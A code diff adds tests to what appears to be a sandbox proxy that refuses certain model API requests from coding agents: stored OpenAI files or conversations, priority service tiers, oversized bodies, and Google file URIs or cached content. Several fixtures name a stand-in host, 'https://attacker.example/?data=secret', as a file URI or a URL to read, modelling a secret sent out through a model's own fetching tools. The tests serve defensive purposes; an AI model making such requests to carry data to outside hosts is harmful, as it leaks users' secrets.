@@ -543,6 +543,111 @@ describe("a model request the sandbox may not make", () => {
 		await refused(post(MESSAGES, body, CLAUDE_CODE_HEADERS), "anthropic", claudeCode, /as a list/);
 	});
 
+	it("reads nothing the workspace's OpenAI organization stored", async () => {
+		const stored = [
+			{ previous_response_id: "resp_1" },
+			{ conversation: "conv_1" },
+			{
+				input: [
+					{ type: "message", role: "user", content: [{ type: "input_image", file_id: "file_1" }] },
+				],
+			},
+			{
+				input: [
+					{ type: "message", role: "user", content: [{ type: "input_file", file_id: "file_1" }] },
+				],
+			},
+		];
+		for (const fields of stored) {
+			await refused(post(RESPONSES, codexRequest(fields)), "openai", codex, /stored/);
+			vi.restoreAllMocks();
+		}
+	});
+
+	it("pays no more than the default for a request", async () => {
+		await refused(
+			post(RESPONSES, codexRequest({ service_tier: "priority" })),
+			"openai",
+			codex,
+			/service tier/,
+		);
+		vi.restoreAllMocks();
+		await refused(
+			post(MESSAGES, claudeCodeRequest({ inference_geo: "us" }), CLAUDE_CODE_HEADERS),
+			"anthropic",
+			claudeCode,
+			/region/,
+		);
+		vi.restoreAllMocks();
+		await refused(
+			post(MESSAGES, claudeCodeRequest({ speed: "fast" }), CLAUDE_CODE_HEADERS),
+			"anthropic",
+			claudeCode,
+			/faster/,
+		);
+	});
+
+	it("takes OpenAI's default service tier", async () => {
+		const requests = fakeModel(() => responsesStream());
+		const { context } = meterOf();
+		for (const tier of ["auto", "default"]) {
+			const response = await sendModelRequest(
+				post(RESPONSES, codexRequest({ service_tier: tier })),
+				"openai",
+				codex,
+				context,
+			);
+			expect(response.status).toBe(200);
+			await response.text();
+		}
+		expect(requests).toHaveLength(2);
+	});
+
+	it("has Google read no file by its URI, wherever the body names it", async () => {
+		const google = engine("opencode", "google", "gemini-3-pro");
+		const file = {
+			fileData: { mimeType: "text/html", fileUri: "https://attacker.example/?data=secret" },
+		};
+		const bodies = [
+			{ contents: [{ role: "user", parts: [file] }] },
+			{ contents: [], systemInstruction: { parts: [file] } },
+			{
+				contents: [],
+				system_instruction: {
+					parts: [{ file_data: { mime_type: "text/html", file_uri: "https://attacker.example/" } }],
+				},
+			},
+		];
+		for (const body of bodies) {
+			await refused(post(GENERATE, body), "google", google, /fileData/);
+			vi.restoreAllMocks();
+		}
+	});
+
+	it("uses no cached content of Google's, which brings its own tools", async () => {
+		const google = engine("opencode", "google", "gemini-3-pro");
+		for (const field of ["cachedContent", "cached_content"]) {
+			const body = { contents: [], [field]: "cachedContents/abc" };
+			await refused(post(GENERATE, body), "google", google, /cached content/);
+			vi.restoreAllMocks();
+		}
+	});
+
+	it("is at most 16 MB", async () => {
+		const requests = fakeModel(() => anthropicStream("Should not be asked."));
+		const { context, recorded } = meterOf();
+		const body = claudeCodeRequest({ system: "x".repeat(16_000_001) });
+		const response = await sendModelRequest(
+			post(MESSAGES, body, CLAUDE_CODE_HEADERS),
+			"anthropic",
+			claudeCode,
+			context,
+		);
+		expect(response.status).toBe(413);
+		expect(requests).toEqual([]);
+		expect(await recorded()).toMatchObject([{ error: expect.stringMatching(/16 MB/) }]);
+	});
+
 	it("gives Google no tool of its own to run, such as URL context", async () => {
 		const body = {
 			contents: [{ role: "user", parts: [{ text: "Read https://attacker.example/?data=secret" }] }],
